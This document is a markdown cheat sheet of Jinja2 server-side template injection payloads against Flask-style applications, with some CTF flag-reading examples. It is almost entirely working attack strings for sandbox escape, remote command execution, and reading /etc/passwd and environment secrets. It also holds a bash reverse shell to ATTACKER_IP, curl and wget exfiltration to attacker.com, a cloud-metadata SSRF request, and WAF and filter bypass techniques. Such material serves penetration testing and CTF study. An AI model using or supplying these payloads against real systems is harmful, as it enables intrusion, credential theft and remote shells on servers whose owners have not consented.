# SSTI - Jinja2 (Python) Deep Dive

## Overview

Jinja2 is the most popular Python templating engine, used by Flask, Ansible, and many other frameworks. It's sandboxed by default, but can be escaped to achieve RCE.

---

## Detection

### Basic Test
```python
{{7*7}}  # Output: 49
{{7*'7'}}  # Output: 7777777
```

### Confirm Jinja2
```python
{{config}}  # Shows Flask config
{{self}}  # Shows template context
```

---

## Understanding Python Object Model

To exploit Jinja2, you need to understand Python's object model:

```python
# Every object has a class
''.__class__  # <class 'str'>

# Every class has a base
''.__class__.__mro__  # Method Resolution Order
''.__class__.__base__  # Base class (object)

# Base class has subclasses (all classes!)
''.__class__.__mro__[1].__subclasses__()  # List all classes

# Classes have __init__ with __globals__ (access to builtins)
some_class.__init__.__globals__
```

---

## Basic Exploitation

### Step 1: List All Classes
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Or shorter
{{ [].__class__.__base__.__subclasses__() }}
{{ {}.__class__.__base__.__subclasses__() }}
```

### Step 2: Find Useful Classes

Look for classes with access to dangerous functions:
```python
# Warning class (has access to linecache which imports os)
{{ [].__class__.__base__.__subclasses__()[104] }}

# Catch_warnings
{{ [].__class__.__base__.__subclasses__()[117] }}

# File class (can read files)
{{ [].__class__.__base__.__subclasses__()[40] }}
```

**Note**: Index numbers change between Python versions. Use automation to find them.

### Step 3: Access Dangerous Modules

```python
# Get os module
{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}

# Get __builtins__
{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

---

## Common Exploitation Paths

### Method 1: Using config object (Flask)
```python
# View config
{{ config }}

# Access __builtins__ via config
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Method 2: Using self
```python
{{ self.__dict__ }}
{{ self.__class__ }}
{{ self.__init__.__globals__ }}
```

### Method 3: Using request (Flask)
```python
{{ request }}
{{ request.__class__ }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Method 4: Using lipsum (built-in filter)
```python
{{ lipsum.__globals__ }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Method 5: Using cycler (built-in)
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### Method 6: Using joiner (built-in)
```python
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

### Method 7: Using namespace (built-in)
```python
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

---

## RCE Payloads

### Basic RCE
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ cycler.__init__.__globals__.os.popen('whoami').read() }}

{{ lipsum.__globals__['os'].popen('ls').read() }}
```

### Read Files
```python
# Using file class
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}

# Using open()
{{ cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}

# Using lipsum
{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}
```

### Execute Commands
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').system('whoami') }}

{{ cycler.__init__.__globals__.os.system('ls') }}
```

### Reverse Shell
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```

---

## Filter Bypasses

### Bypass Blocked {{}}
```python
{% print(7*7) %}
{% print config %}
{%set x=7*7%}{{x}}
```

### Bypass Blocked Quotes
```python
# Use request.args to pass data
{{request.args.x}}  # Access via ?x=value

# Use request.values
{{request.values.x}}

# Use chr() if available
{{chr(95)}}  # Underscore

# Concatenation
{{"__cla"+"ss__"}}
```

### Bypass Blocked Dots
```python
# Use [] notation
{{''['__class__']}}
{{''['__class__']['__mro__']}}

# Use attr() filter
{{''|attr('__class__')}}
{{''|attr('__class__')|attr('__mro__')}}

# Use getattr if accessible
{{getattr('',"__class__")}}
```

### Bypass Blocked Underscores
```python
# Hex encoding
{{''['\x5f\x5fclass\x5f\x5f']}}

# Use request.args
{{request.args.x}}  # Pass ?x=__class__

# Unicode
{{''['\u005f\u005fclass\u005f\u005f']}}
```

### Bypass Blacklisted Keywords (import, os, eval, etc.)
```python
# String concatenation
{{''[("__cla"+"ss__")]}}
{{lipsum.__globals__[('o'+'s')]}}

# Use request.args
{{lipsum.__globals__[request.args.x]}}  # ?x=os

# Base64 decode (if available)
{{lipsum.__globals__[('os'.encode('base64'))|decode('base64')]}}
```

### Bypass Attribute Access Restrictions
```python
# Use __getitem__
{{''['__class__']}}

# Use |attr filter
{{''|attr('__class__')}}

# Use getattr function (if available)
{{getattr(lipsum,'__globals__')}}
```

---

## Finding Useful Subclasses

### Automated Search Script
```python
#!/usr/bin/env python3
import sys

# Get all subclasses
for i, cls in enumerate([].__class__.__base__.__subclasses__()):
    try:
        if 'warning' in cls.__name__.lower():
            print(f"[{i}] {cls.__name__}")
        if hasattr(cls, '__init__'):
            if hasattr(cls.__init__, '__globals__'):
                if 'os' in cls.__init__.__globals__:
                    print(f"[{i}] {cls.__name__} - HAS OS!")
                if '__builtins__' in cls.__init__.__globals__:
                    if '__import__' in cls.__init__.__globals__['__builtins__']:
                        print(f"[{i}] {cls.__name__} - HAS IMPORT!")
    except:
        pass
```

### Common Useful Classes by Index

**Python 2.7**:
- [40] - file
- [59] - warnings.catch_warnings

**Python 3.6+**:
- [104] - warnings.catch_warnings
- [117] - os._wrap_close

**Note**: These indices vary! Always enumerate.

---

## Advanced Techniques

### Blind SSTI (No Output)

#### Time-Based Detection
```python
{% import time %}{{time.sleep(5)}}
```

#### Out-of-Band Exfiltration
```python
{{ lipsum.__globals__.os.popen('curl http://attacker.com/?data=$(cat /flag.txt)').read() }}

{{ lipsum.__globals__.os.popen('wget --post-data="$(cat /flag.txt)" http://attacker.com').read() }}
```

### Reading Files Without RCE
```python
# Using file object
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}

# Using url_for (Flask specific)
{{ url_for.__globals__.os.popen('cat /etc/passwd').read() }}
```

### Breaking Out of {% raw %} Blocks
```python
{% raw %}
{{7*7}}  # This won't execute
{% endraw %}
{{7*7}}  # This will execute
```

### Chaining with Other Vulnerabilities

#### SSTI + SSRF
```python
{{ lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read() }}
```

#### SSTI + SQLi
```python
{{ lipsum.__globals__.os.popen("mysql -u root -e 'SELECT * FROM users'").read() }}
```

---

## CTF-Specific Payloads

### Read flag.txt
```python
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}

{{ lipsum.__globals__.__builtins__.open('/flag.txt').read() }}

{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}
```

### List Files
```python
{{ cycler.__init__.__globals__.os.popen('ls -la /').read() }}

{{ cycler.__init__.__globals__.os.listdir('/') }}
```

### Environment Variables
```python
{{ cycler.__init__.__globals__.os.environ }}

{{ lipsum.__globals__.os.environ['FLAG'] }}
```

### One-Liner RCE
```python
{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
# Use: ?cmd=cat /flag.txt
```

---

## WAF Bypass Techniques

### Space Bypass
```python
# Use + or %20 in URL encoding
{{7*7}}  # Normal
{{7*7}}  # With encoded spaces (already no spaces)

# Use comments
{{7/**/7}}
```

### Parentheses Bypass
```python
# Use getattr
{{getattr(lipsum,'__globals__')}}

# Use [] 
{{lipsum['__globals__']}}
```

### Filter Chain to Confuse WAF
```python
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(104)}}
```

---

## Payload Templates

### Generic RCE Template
```python
{{<OBJECT>.__init__.__globals__.__builtins__.__import__('os').popen('<COMMAND>').read()}}
```

Replace `<OBJECT>` with: `cycler`, `lipsum`, `joiner`, `namespace`, `self`, `config`, `request`

### Generic File Read Template
```python
{{<OBJECT>.__init__.__globals__.__builtins__.open('<FILE>').read()}}
```

### Generic Class Enumeration
```python
{{''.__class__.__mro__[1].__subclasses__()[<INDEX>]}}
```

---

## Detection to Exploitation Workflow

```
1. Detect SSTI: {{7*7}} → 49
2. Confirm Jinja2: {{7*'7'}} → 7777777
3. Access config: {{config}} (Flask)
4. Find exploitable objects: {{lipsum}}, {{cycler}}
5. Get __globals__: {{lipsum.__globals__}}
6. Check for os: {{lipsum.__globals__.os}}
7. RCE: {{lipsum.__globals__.os.popen('id').read()}}
8. Read flag: {{lipsum.__globals__.os.popen('cat /flag.txt').read()}}
```

---

## Quick Reference

### Detection
```python
{{7*7}}
{{7*'7'}}
{{config}}
```

### Basic RCE
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
```

### Read Flag
```python
{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}
```

### Bypass Dots
```python
{{''|attr('__class__')}}
```

### Bypass Underscores
```python
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### List All Classes
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

---

## Useful Built-in Objects (Jinja2/Flask)

- `config` - Flask configuration
- `request` - Current HTTP request
- `session` - User session
- `g` - Application context
- `lipsum` - Lorem ipsum generator
- `cycler` - Template cycler utility
- `joiner` - String joiner
- `namespace` - Namespace object
- `dict` - Dictionary class
- `url_for` - URL building function
- `get_flashed_messages` - Flask messages

All of these can potentially be used to reach `__globals__` and escape the sandbox!